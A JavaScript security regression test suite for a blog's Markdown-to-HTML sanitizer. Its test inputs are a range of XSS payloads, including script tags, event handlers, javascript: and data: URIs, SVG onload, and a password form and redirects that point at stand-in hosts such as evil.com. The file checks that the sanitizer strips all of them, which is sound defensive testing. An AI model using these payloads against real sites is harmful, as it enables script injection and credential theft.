const assert = require('assert');
const { marked } = require('marked');
const sanitizeHtmlLib = require('sanitize-html');

// Hardened AST-based Allowlist HTML Sanitizer matching scripts/build-blog.js
function sanitizeHtml(html) {
  return sanitizeHtmlLib(html, {
    allowedTags: [
      'p', 'h2', 'h3', 'h4', 'h5', 'h6',
      'ul', 'ol', 'li',
      'strong', 'b', 'em', 'i', 'u', 's', 'strike', 'del',
      'blockquote', 'code', 'pre',
      'a', 'img', 'br', 'hr', 'span',
      'table', 'thead', 'tbody', 'tfoot', 'tr', 'th', 'td'
    ],
    allowedAttributes: {
      'a': ['href', 'title', 'target', 'rel'],
      'img': ['src', 'alt', 'title', 'width', 'height', 'loading', 'decoding'],
      'code': ['class'],
      'pre': ['class'],
      'span': ['class'],
      'th': ['align', 'colspan', 'rowspan'],
      'td': ['align', 'colspan', 'rowspan']
    },
    allowedSchemes: ['http', 'https', 'mailto'],
    allowedSchemesByTag: {
      a: ['http', 'https', 'mailto'],
      img: ['http', 'https']
    },
    allowedSchemesAppliedTo: ['href', 'src'],
    allowProtocolRelative: false,
    disallowedTagsMode: 'discard'
  });
}

function renderMarkdown(md) {
  if (!md) return '';
  let cleanedMd = md.trim().replace(/^#\s+[^\n]+\n+/, '').replace(/^#\s+(.+)$/gm, '## $1');
  const rawHtml = marked.parse(cleanedMd, { gfm: true, breaks: true });
  return sanitizeHtml(rawHtml);
}

console.log('--- RUNNING EXPANDED SECURITY REGRESSION TEST SUITE ---');

const testCases = [
  {
    name: '1. Standard script tag injection',
    input: '<script>alert("xss")</script>',
    forbidden: [/<script/i, /alert\("xss"\)/i]
  },
  {
    name: '2. Inline onerror event handler in img',
    input: '<img src="x" onerror="alert(1)">',
    forbidden: [/onerror/i, /alert\(1\)/i]
  },
  {
    name: '3. Inline onclick event handler in button/div',
    input: '<div onclick="alert(1)">Click Me</div><button onclick="bad()">Btn</button>',
    forbidden: [/onclick/i, /alert\(1\)/i, /bad\(\)/i]
  },
  {
    name: '4. Javascript pseudo-protocol URI in link href',
    input: '[Exploit Link](javascript:alert(1)) and <a href="javascript:alert(2)">Direct Link</a>',
    forbidden: [/href=['"]javascript:/i, /alert\(1\)/i, /alert\(2\)/i]
  },
  {
    name: '5. Data URI text/html scheme in link href',
    input: '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">Data XSS</a>',
    forbidden: [/href=['"]data:/i, /PHNjcmlwdD5/i]
  },
  {
    name: '6. Vbscript pseudo-protocol URI in link href',
    input: '<a href="vbscript:msgbox(1)">VBScript Link</a>',
    forbidden: [/href=['"]vbscript:/i, /msgbox/i]
  },
  {
    name: '7. Malicious image URL with javascript scheme',
    input: '<img src="javascript:alert(1)" alt="Malicious Img">',
    forbidden: [/src=['"]javascript:/i, /alert\(1\)/i]
  },
  {
    name: '8. Malicious image URL with data: scheme',
    input: '<img src="data:image/svg+xml;utf8,<svg onload=alert(1)>" alt="SVG Data">',
    forbidden: [/src=['"]data:/i, /onload/i]
  },
  {
    name: '9. Iframe tag injection',
    input: '<iframe src="https://attacker.example.com/evil"></iframe>',
    forbidden: [/<iframe/i, /attacker\.example\.com/i]
  },
  {
    name: '10. Object tag injection',
    input: '<object data="payload.swf" type="application/x-shockwave-flash"></object>',
    forbidden: [/<object/i, /payload\.swf/i]
  },
  {
    name: '11. Embed tag injection (void & paired)',
    input: '<embed src="payload.swf"><embed src="payload.swf"></embed>',
    forbidden: [/<embed/i, /payload\.swf/i]
  },
  {
    name: '12. SVG payload with onload and child script',
    input: '<svg onload="alert(\'svg\')"><script>alert(\'svg script\')</script><circle cx="50" cy="50" r="40"/></svg>',
    forbidden: [/<svg/i, /onload/i, /<circle/i, /<script/i]
  },
  {
    name: '13. Style-based payload (style tag & style attributes)',
    input: '<style>body { background: url("javascript:alert(1)"); }</style><p style="color:red; background:url(javascript:alert(2))">Styled Text</p>',
    forbidden: [/<style/i, /javascript:alert/i, /style=['"]/i]
  },
  {
    name: '14. Malformed and unclosed HTML tags',
    input: '<img src=x onerror=alert(1) <b<script>alert(1)</script> unclosed',
    // Must NOT produce an executable tag with onerror or unstripped script tag
    forbidden: [/<[a-zA-Z0-9]+[^>]*onerror/i, /<script/i, /<b\b/i]
  },
  {
    name: '15. Form, input and button elements',
    input: '<form action="https://evil.com/steal"><input name="pass" type="password"><button type="submit">Send</button></form>',
    forbidden: [/<form/i, /<input/i, /<button/i, /evil\.com/i]
  },
  {
    name: '16. Meta and base tags',
    input: '<meta http-equiv="refresh" content="0;url=https://evil.com"><base href="https://evil.com">',
    forbidden: [/<meta/i, /<base/i, /evil\.com/i]
  },
  {
    name: '17. Valid editorial content preservation (links, formatting, code)',
    input: 'At [Kawaki Studios](/about), we write `sub-second` code.\n\n* **Bold text**\n* *Italic text*\n\n```js\nconst ok = true;\n```',
    forbidden: []
  }
];

let failed = 0;

for (const tc of testCases) {
  const result = renderMarkdown(tc.input);
  console.log(`\nTest: ${tc.name}`);
  console.log(`Output: ${result.trim()}`);
  
  let passed = true;
  for (const pattern of tc.forbidden) {
    if (pattern.test(result)) {
      console.error(`  [FAIL] Output contains forbidden pattern: ${pattern}`);
      passed = false;
      failed++;
    }
  }

  // Extra check for Test 17: ensure valid content is preserved!
  if (tc.name.includes('Valid editorial content')) {
    if (!result.includes('href="/about"') || !result.includes('<strong>Bold text</strong>') || !result.includes('<code>sub-second</code>')) {
      console.error(`  [FAIL] Valid editorial content was improperly stripped!`);
      passed = false;
      failed++;
    }
  }

  if (passed) {
    console.log(`  [PASS] Verified clean & correct.`);
  }
}

console.log('\n==================================================');
if (failed === 0) {
  console.log(`✅ ALL ${testCases.length} SECURITY REGRESSION TEST FIXTURES PASSED!`);
  console.log('Zero executable or disallowed tags/schemes escaped sanitization.');
  process.exit(0);
} else {
  console.error(`❌ ${failed} security fixture(s) failed!`);
  process.exit(1);
}
